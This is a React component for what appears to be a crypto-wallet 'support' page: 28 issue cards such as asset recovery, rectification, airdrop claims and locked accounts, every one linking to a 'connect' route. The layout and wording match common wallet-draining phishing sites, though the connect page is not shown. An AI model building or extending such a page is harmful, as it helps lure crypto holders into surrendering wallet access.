import React from "react";
import { FaBuildingColumns } from "react-icons/fa6";
import { GoIssueOpened } from "react-icons/go";
import { AiOutlineSolution } from "react-icons/ai";
import { LiaSellsy } from "react-icons/lia";
import { FaRankingStar } from "react-icons/fa6";
import { LuBaggageClaim } from "react-icons/lu";
import { RiLuggageDepositLine } from "react-icons/ri";
import { GrValidate } from "react-icons/gr";
import { MdError } from "react-icons/md";
import { GrTransaction } from "react-icons/gr";
import { GoIssueDraft } from "react-icons/go";
import { TbTransfer } from "react-icons/tb";
import { GiStakesFence } from "react-icons/gi";
import { PiSwap } from "react-icons/pi";
import { SiWalletconnect } from "react-icons/si";
import { RiCustomerServiceFill } from "react-icons/ri";
import { BiSolidLogIn } from "react-icons/bi";
import { SiAcclaim } from "react-icons/si";
import { SiThemighty } from "react-icons/si";
import { RiNftLine } from "react-icons/ri";
import { MdCallMissed } from "react-icons/md";
import { AiOutlineIssuesClose } from "react-icons/ai";
import { CiDeliveryTruck } from "react-icons/ci";
import { GoRepoLocked } from "react-icons/go";
import { GiTrade } from "react-icons/gi";
import { FaCoins } from "react-icons/fa";
import { MdOutlineGeneratingTokens } from "react-icons/md";
import { BsMotherboardFill } from "react-icons/bs";





import { Link } from "react-router-dom";

const datas = [
  {
    heading: "Assets Recovery",
    text: "Click here for assets recovery issues",
    image: <FaBuildingColumns />,
  },
  {
    heading: "General Issues",
    text: "Click here for general related issues",
    image: <GoIssueOpened />,
  },
  {
    heading: "Rectification",
    text: "Click here to rectify issues",
    image: <AiOutlineSolution />,
  },
  {
    heading: "Buy and Sell",
    text: "Click here for to buy and sell tokens.",
    image: <LiaSellsy/>,
  },
  {
    heading: "High Gas Fees",
    text: "Click here for gas fee related issues.",
    image: <FaRankingStar />,
  },
  {
    heading: "Claim Reward",
    text: "Click here for reward related issues.",
    image: <LuBaggageClaim />,
  },
  {
    heading: "Deposits & Withdrawals",
    text: "Click here for withdrawal related issues.",
    image: <RiLuggageDepositLine />,
  },
  {
    heading: "Validation",
    text: "click here for Validation related issues.",
    image: <GrValidate />,
  },
  {
    heading: "Slippage Error",
    text: "Click here for slippage related error during trade.",
    image: <MdError  />,
  },
  {
    heading: "Transaction Error",
    text: "Click here for transaction related issues.",
    image: <GrTransaction />,
  },
  {
    heading: "Liquidity Issues",
    text: "Click here for liquidity related issues.",
    image: <GoIssueDraft/>,
  },
  {
    heading: "Cross Chain Transfer",
    text: "Click here for cross chain bridge issues.",
    image: <TbTransfer />,
  },
  {
    heading: "Staking",
    text: "click here for staking related issues.",
    image: <GiStakesFence />,
  },
  {
    heading: "Swap/Exchange",
    text: "Click here for swap/exchange related issues.",
    image: <PiSwap />,
  },
  {
    heading: "Connect to Dapps",
    text: "Click here for error while connecting to Dapps",
    image: <SiWalletconnect />,
  },
  {
    heading: "KYC",
    text: "Click here KYC related issues.",
    image: <RiCustomerServiceFill />,
  },
  {
    heading: "Login Issues",
    text: "Click here for issues while logging into your wallet.",
    image: <BiSolidLogIn />,
  },
  {
    heading: "Claim Airdrop",
    text: "Click here for airdrop related issues.",
    image: <SiAcclaim />,
  },
  {
    heading: "Migration",
    text: "Click here for any issues related to migration.",
    image: <SiThemighty />,
  },
  {
    heading: "NFTS Issues",
    text: "Click here for NFTs minting/transfer related issues.",
    image: <RiNftLine />,
  },
  {
    heading: "Missing/Irregular Balance",
    text: "Click here to recover lost/missing funds.",
    image: <MdCallMissed />,
  },
  {
    heading: "Whitelist Issues",
    text: "Click here for whitelist related issues.",
    image: <AiOutlineIssuesClose />,
  },
  {
    heading: "Transaction Delay",
    text: "Click here for any issues related to transaction delayed.",
    image: <CiDeliveryTruck />,
  },
  {
    heading: "Locked Account",
    text: "Click here for issues related to account lock.",
    image: <GoRepoLocked />,
  },
  {
    heading: "Trading Wallet Issues",
    text: "Click here if you have problem with your trading wallet.",
    image: <GiTrade />,
  },
  {
    heading: "Unable To Buy Coins/Tokens",
    text: "To trade crypto your account must be marked as a trusted payment source.",
    image: <FaCoins />,
  },
  {
    heading: "Token Bridge",
    text: "Click here for any issues related to token bridge.",
    image: <MdOutlineGeneratingTokens />,
  },
  {
    heading: "Other Issues Not Listed",
    text: "If you can't find the issue you are experiencing click here",
    image: <BsMotherboardFill />,
  },
];

const Section = () => {
  return (
    <div className="">
      <h1 className="mb-7 text-4xl md:text-5xl font-semibold text-white">
        Make Your Selection Below
      </h1>
      <div className="grid md:grid-cols-2 xl:grid-cols-3 gap-5">
        {datas.map((data, key) => {
          return (
            <div className=" text-xl flex flex-col items-start bg-gray-300 rounded-2xl p-7 gap-5">
              <span className="text-7xl text-[#0D0D2B]">{data.image}</span>
              <h2 className="text-2xl">{data.heading}</h2>
              <Link to="connect">
                <p>{data.text}</p>
              </Link>{" "}
            </div>
          );
        })}
      </div>
    </div>
  );
};

export default Section;
